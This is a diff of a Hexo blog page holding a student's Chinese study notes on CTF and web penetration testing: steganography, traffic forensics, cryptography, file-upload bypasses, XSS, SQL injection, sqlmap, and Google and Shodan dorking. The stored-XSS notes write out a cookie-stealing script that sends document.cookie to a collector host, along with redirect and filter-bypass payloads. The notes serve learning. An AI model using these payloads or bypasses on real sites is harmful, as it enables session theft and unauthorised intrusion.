@@ -61,10 +61,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-10.17" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/10/20/hello-world/" class="article-date">
-  <time datetime="2019-10-20T13:48:20.202Z" itemprop="datePublished">2019-10-20</time>
+    <a href="/2019/10/20/10.17/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.508Z" itemprop="datePublished">2019-10-20</time>
 </a>
     
   </div>
@@ -75,7 +75,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/20/hello-world/">Hello World</a>
+      <a class="article-title" href="/2019/10/20/10.17/">学习笔记</a>
     </h1>
   
 
@@ -83,24 +83,379 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <p>misc（进阶）、流量取证、密码学</p>
+<h2 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h2><p>Dd手动分离：<br>Dd if=源文件 of=目标文件名 bs=读写块大小 skip=开始分离的字节数<br><by></p>
+<h2 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h2><p>Linux下：<br>cat 合并的文件&gt;输出的文件<br>完整性检测：<br>md5sum 文件名<br><by><br>Windows下：<br>copy /B 合并的文件 输出的文件<br>完整性检测：<br>certutil-hashfile 文件名 md5<br><by></p>
+<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>工具：<br>Fireworks工具：<br>处理Firework标志的图像<br>图层分解、帧分析<br><by><br>stegsolve工具（Java环境）：<br>功能：<br>通道分离、LSB分离、图像对比<br><by></p>
+<h3 id="图片加密"><a href="#图片加密" class="headerlink" title="图片加密"></a>图片加密</h3><p>Bftools 工具（windows）:<br>可以对加密过的图片进行加密，也可以加密图片<br><by><br>进入工具目录，运行bftools.exe decode braincopter 要加密的图片文件名 –output 输出文件名<br>bftools.exe run 上一步输出的文件名<br><by><br>silentEye（windows、图形化）工具：<br>一款可以将文字或文件隐藏到图片中的解密工具<br><by></p>
+<h2 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>数据包的有效数据不会超过1500字节<br><by><br>TCP（Transmission Control Protocol，传输控制协议）提供的是面向连接，可靠的字节流服务。即客户和服务器交换数据前，必须现在双方之间建立一个TCP连接，之后才能传输数据。并且提供超时重发。<br><by><br>UDP（User Data Protocol，用户数据报协议）是一个简单的面向数据报的运输层协议。它不提供可靠性，只是把应用程序传给IP层的数据报发送出去，但是不能保证它们能到达目的地。由于UDP在传输数据报前不用再客户和服务器之间建立一个连接，且没有超时重发等机制，所以传输速度很快<br><by><br>SMTP简单邮件传输协议，传输端口为25<br><by><br>工具：<br>Wireshark工具：<br>常用的过滤命令：<br>过滤IP  ip.src eq(/==) x.x.x.x or(/and) ip.dst eq x.x.x.x<br>过滤端口  tcp.port eq 端口<br>Tcp.dstport==80  //只显示tcp协议的目标端口为80<br>Tcp.srcport==80  //只显示tcp协议的源端口为80<br>tcp/udp/arp/icmp/http/ftp/dns/ip.. //过滤协议<br>contains “ip” //包含某个IP<br><by><br>根据数据包的特征进行筛选：<br>查看数据包是，有的数据包有某些特征，可以筛选出这些特征。(统计-协议分集-作为过滤器应用-选中)</p>
+<h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>考察的流量涉及键盘击键、鼠标移动与点击、存储设备的明文传输，usb无线网卡网络传输内容等<br>键盘数据包的数据长度为8个字节，击键信息集中在第三个字节</p>
+<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><p>概述：为了保证数据传输的可靠性<br>核心：密码学;（用于数据动态传输和静态存储）<br><by><br>发展阶段:<br>第一阶段 古代-19世纪末 古典密码<br>第二阶段 20世纪初-1949 近代密码<br>第三阶段 香农1949发表论文开始 现代密码<br>第四阶段 1976 公钥密码</p>
+<h3 id="对称加密与非对称加密"><a href="#对称加密与非对称加密" class="headerlink" title="对称加密与非对称加密"></a>对称加密与非对称加密</h3><p>对称加密：加、解密使用同一个密钥，速度快，但密钥不能泄露<br>非对称加密：加、解密使用不同的密钥，速度慢（比对称慢1000倍）<br><by><br>公钥、私钥：<br>公钥分给其他人，私钥只有一个，自己拥有（公钥加密只能私钥解密，反之异同）<br>公钥加密：只有私钥能解密，保证能发给特定对象<br>私钥加密：只要有公钥就能解密，只要公钥能解密，就一定是私钥拥有者发出的<br><by><br>注：通常传输数据使用对称加密保证可靠，通常网站使用证书保证安全性<br>如何保证对称密钥的传输？(使用对方的公钥加密传输对称密钥)</p>
+<h3 id="摘要算法："><a href="#摘要算法：" class="headerlink" title="摘要算法："></a>摘要算法：</h3><p>数据摘要算法也被称为哈希(hash)算法、散列算法，常见摘要算法有MD5、SHA<br><by><br>两大特点：雪崩效应(就算只改变1bit，值也完全不同)、不可逆（无法逆推）</p>
+<h2 id="常见编码："><a href="#常见编码：" class="headerlink" title="常见编码："></a>常见编码：</h2><p>ASCII码<br>0~31属于不可打印字符<br><by><br>Base64:<br>用64个可显示字符表示所有的ASC字符<br><by><br>URL编码：<br>url就是一个字符ASCII码的十六进制，需要在前面加上%<br><by><br>等…….<br><by><br>常见算法：<br>移位加密：栅栏密码、曲路密码、列位移密码<br>替换加密：凯撒密码、莫斯密码、ROY5/13/18/47、维吉尼亚密码、培根密码、键盘密码<br>其他：MD4、SHA<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av60627186" target="_blank" rel="noopener">bilibili</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cq-sky.github.io/2019/10/20/hello-world/" data-id="ck1z2slgw0000d0vk1po98k6r" class="article-share-link">Share</a>
+      <a data-url="https://cq-sky.github.io/2019/10/20/10.17/" data-id="ck1z2w7o30000kkvkfbdy5bfp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-10.9" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/10.9/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.508Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/10.9/">学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文件上传（进阶）</p>
+<h2 id="前端js校验"><a href="#前端js校验" class="headerlink" title="前端js校验"></a>前端js校验</h2><p>通过使用js脚本来对上传的文件来进行校验<br>绕过方法：<br>直接关闭js或使用burpsuite抓包改包<br><by></p>
+<h2 id="服务器端校验"><a href="#服务器端校验" class="headerlink" title="服务器端校验"></a>服务器端校验</h2><h3 id="Content-type校验"><a href="#Content-type校验" class="headerlink" title="Content-type校验"></a>Content-type校验</h3><p>对上传文件的Content-type值进行校验<br>绕过方法：<br>1.抓包修改Content-type字段<br>2.该文件名抓包在改回去<br>3.上传正常文件改文件内容<br><by></p>
+<h3 id="后缀名黑名单校验"><a href="#后缀名黑名单校验" class="headerlink" title="后缀名黑名单校验"></a>后缀名黑名单校验</h3><p>通过判断后缀名来校验文件的类型<br>绕过方法：<br>1.大小写绕过，修改后缀名的大小写（Php、PHP等）。<br>2.利用黑名单中没有的，但又能被解析的后缀名（php2、php4、php5、php7、phpt、phtml等）<br>3.使用00截断（有版本限制，较低版本）<br>(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)<br>Text.php%00.jpg  //%00代表十六进制的空字节，如程序先获取文件名，在判断的时候读到%00时会认为结束了。文件名就会变成text.php(要在十六进制中加入00)<br><by></p>
+<h3 id="后缀名白名单校验："><a href="#后缀名白名单校验：" class="headerlink" title="后缀名白名单校验："></a>后缀名白名单校验：</h3><p>通过判断后缀名来校验文件的类型</p>
+<h4 id="解析漏洞："><a href="#解析漏洞：" class="headerlink" title="解析漏洞："></a>解析漏洞：</h4><p>一、文件解析：<br>形式：xxx.php;.jpg<br>原理：服务器默认不解析；号后面的内容，因此会被解析为xxx.php<br>二、apache解析漏洞<br>apache解析文件的规则是从右向左开始判断解析，如果后缀名不可识别，就再往左判断。如：xxx.php.owf.rar,.owf和.rar这两种后缀apache是不可解析识别，就会解析成xxx.php.<br>。<br>。<br><by></p>
+<h3 id="内容头校验"><a href="#内容头校验" class="headerlink" title="内容头校验"></a>内容头校验</h3><p>通过校验文件的16进制文件头来校验文件的类型<br>绕过方法：<br>在上传的脚本前加上允许上传文件的头标识，如：GIF89a //解码后就是GIF的文件头47494638<br><by></p>
+<h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><p>文件上传后，检测是否合法，不合法就删除(上传后会先存储，然后检测是否合法)<br>利用方法：<br>在代码被删除之前访问到就行了，脚本文件只要访问到就可以触发执行，就算后面被删掉了，只要代码另外生成一个脚本文件就可以达到效果。上传后使用BurpSuite来进行访问<br><by></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/10.9/" data-id="ck1z2w7p30003kkvk0251avxf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-10.2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/10.2/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.492Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/10.2/">近期学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>python xss 信息收集</p>
+<h2 id="python选择、循环语句"><a href="#python选择、循环语句" class="headerlink" title="python选择、循环语句"></a>python选择、循环语句</h2><p>选择：<br>If 条件 ：<br>    语句<br>Else:<br>    语句<br><by><br>If 条件：<br>    语句<br>Elif 条件：<br>    语句<br>Else:<br>    语句<br><by><br>循环：<br>While 条件：<br>    语句<br><by><br>循环使用else:<br>While 条件：<br>    语句<br>Else:<br>    语句<br><by><br>for 迭代变量 in 字符串|列表|元组|字典|集合：<br>代码<br><by><br>例：<br>sum=0<br>for i in range(101):  //计算1的累加<br>sum += i<br><by><br>range(start,end,step)        //由于生成一系列连续的整数，多用于for<br>start：用于指定计数的起始值，如果省略不写，则默认从 0 开始。<br>end：用于指定计数的结束值（不包括此值），此参数不能省略。<br>step：用于指定步长，即两个数之间的间隔，如果省略，则默认步长为 1。</p>
+<h2 id="Dom型XSS"><a href="#Dom型XSS" class="headerlink" title="Dom型XSS"></a>Dom型XSS</h2><p>Dom:<br>网页中的用来表示文档中对象的标准模型，通过JavaScript可以对网页中的所有DOM对象进行操作,可以理解为一个一个访问HTML的标准编程接口。过程全都在前端完成。不经过后端<br><by><br>Dom型xss：<br>前端的输入被dom获取到了，然后通过dom又在前端输出了。和发射型和存储型相比没有经过后台</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Web信息收集，主要是掌握目标web服务的方方面面，实现渗透前的准备工作。<br>主要内容包括操作系统、服务器类型、数据库类型、web容器、web语言、域名信息、网站目录。涉及搜索引擎、网站扫描、域名遍历、指纹识别等。<br><by><br>Google Hacking:<br>Site:<br>用来搜索指定的域名的网页内容，可以用来搜索子域名、和此域名相关的内容。<br>Site:域名（zhihu.com ）  搜索和域名网站相关的网页<br>“内容” site:域名  搜索域名网站中和内容相关的网页<br><by><br>filetype：<br>搜索指定文件类型<br>“内容” filetype:pdf(各种格式)  搜索和内容相关的pdf文件<br>Site:域名 filetype:pdf  联合使用，搜索域名网站中的pdf文件<br><by><br>Inurl:<br>搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站<br>Inurl: .php?id=(某个内容)  搜索网址中有.php?id=的网页<br><by><br>Intitle:<br>搜索标题存在特定关键字的网页<br>Intitle:后台登陆(任意内容)  搜索网页标题是”后台登录”的相关网页<br>Intitle:后台登陆 flietype:php  搜索网页标题是”后台登录”的php页面<br>Intitle:index of “关键字”  搜索此关键字(admin login等)的索引目录信息<br><by><br>Intext:<br>搜索正文存在特定关键字的网页<br>Intext:powered by 任意内容  搜索与内容相关的页面，可以搜索一些软件的关键字<br>如：<br>Discuz    一款开源的论坛软件<br>Wordpress   使用php开发的博客平台<br>CMS  内容管理系统，可以理解为建站系统<br><by><br>符号：<br>-关键字   强制结果不要出现此关键字<br>*关键字  模糊搜索，强制结果包含此关键字<br>“关键字”  强制结果出现此关键字<br>~单词   同时搜索近义词<br>2017..2019   显示指定年份时间段内的结果<br><by><br>通过上面的一些搜索技巧可以搜索到网站隐藏的较深的后台登录界面，或者得知网站使用哪一个软件来搭建的及软件版本号。<br><by><br>小知识：<br>Define:单词  查询单词的定义<br>谷歌可以进行数学计算，直接输入算式就行<br>单位换算功能：54磅=？公斤<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="www.google.com">Google</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/10.2/" data-id="ck1z2w7oq0001kkvkf9j1gujh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-10.4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/10.4/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.492Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/10.4/">近期学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>信息收集(shodan的使用)</p>
+<h2 id="Shodan-Hacking"><a href="#Shodan-Hacking" class="headerlink" title="Shodan Hacking"></a>Shodan Hacking</h2><p>Shodan(撒旦搜索引擎），被称为“最可怕的搜索引擎”，可扫描一切联网的设备，除了常见的web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。<br><by><br>IP<br>直接搜索IP<br><by><br>服务/产品：<br>搜索服务(过滤功能需要登录才能使用)<br>例： 服务名 ….<br>http:<br>http country:”两位国家代码”  搜索指定国家的http主机<br>(DE 德国 CN 中国 US 美国 JP 日本……)<br>http product:”Apache httpd” 搜索指定产品为Apache httpd的http主机<br><by><br>ssh:<br>ssh default 关键词  搜索服务为ssh，指定关键词<br>(也支持搜索关键字)<br><by><br>Country：<br>搜索指定国家<br>Country:”两位国家代码”<br><by><br>product:<br>搜索指定产品<br>product:”Apache httpd”  搜索指定产品为Apache httpd<br>(nginx mysql…..)<br><by><br>Version<br>搜索版本号<br>product:MySql Version:”5.1.73” 搜索服务为MySQL，版本号为5.1.73<br><by><br>hostname:<br>搜索指定站点<br>hostname:站点 搜索指定站点<br>hostname:.org  搜索主机名中有.org<br><by><br>os<br>指定操作系统及版本<br>Os:”linux 2.6.x” 系统为linux 2.6<br>Os:”windows 7 or 8” 系统为windows 7 或 8<br><by><br>Net<br>搜索指定网段<br>Net:网段  搜索指定网段<br><by><br>Port<br>搜索指定端口<br>Port：端口  搜索指定端口<br><by><br>上面的实例可以综合使用来得到你想要的结果</p>
+<p>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="www.shodan.io">shodan</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/10.4/" data-id="ck1z2w7ox0002kkvkdpk3f33c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-9.27" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.27/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.492Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.27/">9.27学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS跨站脚本攻击</p>
+<h2 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h2><h3 id="常用html标签"><a href="#常用html标签" class="headerlink" title="常用html标签"></a>常用html标签</h3><p>&lt;\iframe&gt;  创建一个包含另外一个文档的内联框架（行内框架）<br>&lt;\textarea&gt; 定义多行文本框输入<br>&lt;\img&gt; 向网页嵌入一幅图像<br>&lt;\script&gt; 定义客户端脚本，如Java script，script既可以包含脚本语句，也可以通过src属性指向外部脚本文件，必须的type属性规定脚本的mime类型常见应用：图像操作、表单验证、动态内容更新<br><by></p>
+<h4 id="常用Java-script方法"><a href="#常用Java-script方法" class="headerlink" title="常用Java script方法"></a>常用Java script方法</h4><p>Alert()  //显示一条带一条指定消息与一个确认按钮的警告框<br>Window.location  //获得当前页面的地址（URL），并把浏览器重定向到新的页面<br>Location.href  //返回当前显示的文档的完整URL<br>Onload  //一张页面或一幅图像完成加载<br>Onsubmit  //确认按钮被点击<br>Onerror  //在加载文档或图像时发生错误<br><by></p>
+<h5 id="Xss脚本"><a href="#Xss脚本" class="headerlink" title="Xss脚本"></a>Xss脚本</h5><p>&lt;\script&gt;alert(document.cookie)&lt;/script&gt;  //弹窗取得cookie<br>&lt;\iframe src=http://网站链接 width=xx height=xx&gt;&lt;/iframe&gt; 嵌套一个页面（高、宽设为0，可使嵌入的网页不可及）<br>&lt;\script&gt; window.location=”链接” &lt;/script&gt;  //重定向到某个链接<br>&lt;\script&gt; alert(“xss”);window.location=”链接” &lt;/script&gt;  //联合使用（通过显示一些类提示信息来诱导用户）<br>&lt;\script src=”链接”&gt;&lt;/script&gt;  //访问链接中的恶意代码<br><by><br>绕开过滤的脚本：<br>&lt;\ScrIpt &gt;alert(“xss”)&lt;/SCRipt&gt;  //大小写<br>&lt;\a<br>Href=”base64编码”&gt; xxxxx&lt;/a&gt;  (a标签为超链接，xxx为点击点)//字符编码 采用URL、base64等<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.27/" data-id="ck1z2w7qg0007kkvkfto6a63n" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-9.28" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.28/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.492Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.28/">9.27学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS跨站脚本攻击</p>
+<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>攻击：获取cookie<br>1.构建收集cookie的服务器<br>2.构造xss代码并植入web服务器<br>3.等待受害者触发xss代码并将cookie发送到收集服务器<br>4.利用cookie<br>植入代码：&lt;\script&gt;window.open(‘192.168.106.140/cookie_rec.php?cookie=’+doucument.cookie)&lt;/script&gt;<br><by></p>
+<h3 id="自动化xss"><a href="#自动化xss" class="headerlink" title="自动化xss"></a>自动化xss</h3><p>BeEF:<br>BeEF(Browser Exploitation Framework)目前最强大的浏览器开源渗透测试框架，通过xss漏洞配合js脚本和metasploit来进行渗透，基于Ruby语言编写的，支持图形化界面<br>基于apache来提供页面访问，默认监听在127.0.0.1(本机)的3000端口，默认用户名、密码：beef<br><by><br>功能：<br>信息收集：<br>网络发现、主机信息、Cookie获取、会话劫持、键盘记录、插件信息<br><by><br>持久化控制：<br>确认弹框、小窗口、中间人<br><by><br>社工：<br>点击劫持、弹窗告警、虚假页面、钓鱼页面<br><by><br>渗透攻击：<br>内网渗透、metasploit、CSRF（跨站请求伪造）攻击、DDOS攻击<br><by><br>通过http:// ip：3000\ui\panel 来访问页面<br>钩子文件为：hook.js<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82731839" target="_blank" rel="noopener">CSDN（BeEF的使用）</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.28/" data-id="ck1z2w7qo0009kkvke3pb1xwo" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-9.23" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.23/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.476Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.23/">9.23学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>欢迎来到我的博客，这里将会存放我每周的学习心得，</p>
+<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><h3 id="9-23：SQL注入"><a href="#9-23：SQL注入" class="headerlink" title="9.23：SQL注入"></a>9.23：SQL注入</h3><p>通过向输入框中输入特殊的语句来构造sql语句传到数据库中，从而获得数据库的数据。<br>知识点：<br>MySql的中一些函数：<br>    User();返回当前用户<br>    Database(); 返回当前库<br>    Version(); 返回当前数据库版本<br>    <by><br>    MySql的Information_schema库（保存着数据库中所有的表、库的信息）<br>    库中的tables表，其中table_schema项代表数据库库名，table_name代表其中表的名称。<br>    Columns表中存放着数据库中所有表中的字段信息，Column_name项为数据库表中的字段名。<br>    <by><br>一、注入方式<br>    1.错误注入<br>    本意并不是为了注入语句，故意输入一些错误的符号，查看有无报错，如有报错，则该处可能存在注入点。<br>    <by><br>    2.布尔注入<br>    在文本框中输入’ or 1=1 类的语句，由于代码直接把输入的语句带入sql语句，就会构造出一个永真式，而 – 后面的语句会被注释掉。<br>    <by><br>    3.Union注入<br>    利用union语句来构造SQL语句，从而得到数据库的信息（union联合前后查询项的数目要一致）<br>    如：‘ union select table_schema,table_name from information_schema.tables –- ‘<br>    基于时间的盲注：<br>    可以通过设置sleep语句来探测注入点。<br>    如：1’ and sleep(5) – ‘     //前面给一个真条件，然后闭合路径，后面让语句在执行的同时停5秒，如确实停了5秒，则可能存在注入点<br>    <by><br>    资料链接：<a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.23/" data-id="ck1z2w7p70004kkvk0ozq1hd7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-9.24" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.24/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.476Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.24/">9.24学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>自动化注入sqlmap</p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>(Pythen开发，kali自带工具,win需要安装)<br><by><br>    Sqlmap是一个安全稳定性测试工具，可以进行自动化检测、利用SQL漏洞来注入、获取数据库服务器权限，支持mysql、oracle、postgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、sybaes、SAP MaxDB等.<br><by><br>    sqlmap支持五种不同的注入模式：<br>    1.基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>    2.基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>    3.基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>    4.联合查询注入，可以使用union的情况下的注入。<br>    5.堆查询注入，可以同时执行多条语句的执行时的注入。<br><by><br>    Sqlmap  -h  查看帮助<br>            -u URL 目标url<br>            -g 处理Google dork的结果作为目标URL<br>            –random-agent  使用随机客户端<br>            –dbms=DBMS（MYsql、oracle） 指定数据库类型<br>            –level=LEVEL 指定安全等级（1-5，默认为1）<br>            –risk=RISK 执行测试的风险（0-3，默认为1）<br>            –current-user 返回数据库管理系统当前用户<br>            –current-db 返回网站当前数据库<br>            –os-cmd=OSCMD 执行操作系统命令<br>            –os-shell 交互式的操作系统的shell<br>            –batch 从不询问用户输入，使用所有默认配置</p>
+<p>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">CSDN(sqlmap的使用)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.24/" data-id="ck1z2w7q80005kkvkckdahydn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-9.25" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.25/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.476Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/9.25/">9.25学习笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sqlmap2</p>
+<h2 id="sqlmap2"><a href="#sqlmap2" class="headerlink" title="sqlmap2"></a>sqlmap2</h2><p>–dbs 枚举数据库管理系统数据库<br>-D DBname 要进行枚举的指定数据库名<br>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）<br>–tables 枚举的DBMS数据库中的表<br>–columns 枚举DBMS数据库表列<br>–dump 转储数据库管理系统的数据库中的表项<br>-C “列名”  要进行枚举的数据库列<br>-U user 用来进行枚举的数据库用户<br><by><br>使用cookie来注入：<br>–cookie=COOKIE HTTP  使用Cookie来登录<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">CSDN(sqlmap的使用)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.25/" data-id="ck1z2w7qc0006kkvk85k0hi07" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
